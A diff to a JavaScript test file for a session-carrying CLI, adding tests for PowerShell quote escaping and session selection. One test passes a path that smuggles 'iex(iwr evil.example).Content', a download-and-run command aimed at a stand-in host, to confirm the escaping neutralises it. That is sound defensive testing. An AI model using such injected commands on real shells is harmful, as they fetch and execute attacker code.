@@ -28,7 +28,8 @@ const SCRIPT = path.join(path.dirname(fileURLToPath(import.meta.url)), 'desktop-
 const ACTIVE = 'acc-active';
 const OLD = 'acc-old';
 const DAY = 86_400_000;
-const NOW = Date.parse('2026-11-05T06:00:00Z');
+// The CLI tests run the script against the real clock, so the fixtures are dated against it too.
+const NOW = Date.now();
 
 let seq = 0;
 const uuid = () => `00000000-0000-4000-8000-${String(++seq).padStart(12, '0')}`;
@@ -240,6 +241,16 @@ test('carrySession on Windows hands back the PowerShell command instead of runni
   assert.equal(r.status, 'manual');
   assert.equal(r.command, powershellCommand(c.cwd, c.cliSessionId));
   assert.equal(powershellCommand("C:/it's", 'abc'), "Set-Location -LiteralPath 'C:/it''s'; claude --desktop --resume abc");
+  // PowerShell also ends the literal at the typographic quotes U+2018 to U+201B.
+  assert.equal(
+    powershellCommand('C:/Kai’s Projekte', 'abc'),
+    "Set-Location -LiteralPath 'C:/Kai’’s Projekte'; claude --desktop --resume abc",
+  );
+  const hostile = powershellCommand('C:/x’; iex(iwr evil.example).Content; ‘y‚z‛', 'abc');
+  assert.equal(
+    hostile,
+    "Set-Location -LiteralPath 'C:/x’’; iex(iwr evil.example).Content; ‘‘y‚‚z‛‛'; claude --desktop --resume abc",
+  );
 });
 
 test('hookReport names new candidates once, caps the list, and stays silent afterwards', () => {
@@ -294,10 +305,33 @@ test('the CLI lists candidates as JSON and refuses to carry without an explicit 
   assert.match(unknown.stderr, /kein Kandidat/);
 });
 
+test('the CLI carries a session picked from a wider list without repeating --days', () => {
+  const f = fixture();
+  const s = f.session(OLD, { lastActivityAt: Date.now() - 9 * DAY, title: 'Neun Tage alt' });
+  const wide = JSON.parse(cli(f, ['list', '--json', '--days', '14']).stdout);
+  assert.equal(wide.families[0].main.cliSessionId, s.cliSessionId);
+  assert.equal(JSON.parse(cli(f, ['list', '--json']).stdout).families.length, 0, 'the default list stays at 7 days');
+  const r = spawnSync(process.execPath, [SCRIPT, 'carry', '--id', s.cliSessionId, '--json', '--no-pty'], {
+    encoding: 'utf8',
+    env: {
+      ...process.env,
+      CLAUDE_CONFIG_DIR: f.configDir,
+      LT_DESKTOP_APP_DIR: f.appDir,
+      LT_DESKTOP_CARRY_WAIT_MS: '2000',
+      LT_DESKTOP_CLAUDE_BIN: stubCli(f, 'ok'),
+    },
+  });
+  assert.equal(r.status, 0, r.stderr);
+  const [result] = JSON.parse(r.stdout).results;
+  assert.equal(result.cliSessionId, s.cliSessionId);
+  assert.equal(result.status, process.platform === 'win32' ? 'manual' : 'carried');
+});
+
 test('the CLI carries the selected sessions, main sessions first', () => {
   const f = fixture();
   const main = f.session(OLD, { title: 'Main' });
   const child = f.session(OLD, { spawnedFrom: { name: 'kind', sessionId: main.desktopId }, title: 'Kind' });
+  const notPicked = f.session(OLD, { title: 'Nicht gewählt' });
   const r = spawnSync(
     process.execPath,
     [SCRIPT, 'carry', '--id', child.cliSessionId, '--id', main.cliSessionId, '--json', '--no-pty'],
@@ -314,6 +348,11 @@ test('the CLI carries the selected sessions, main sessions first', () => {
   );
   assert.equal(r.status, 0, r.stderr);
   const out = JSON.parse(r.stdout);
+  assert.equal(out.results.length, 2, 'only the picked sessions are handled');
+  assert.ok(
+    !fs.existsSync(path.join(f.appDir, 'claude-code-sessions', ACTIVE, 'org-a', `local_${notPicked.cliSessionId}.json`)),
+    'a session the user did not pick stays where it is',
+  );
   if (process.platform === 'win32') {
     // Windows hands back one PowerShell command per session instead of running it.
     assert.deepEqual(
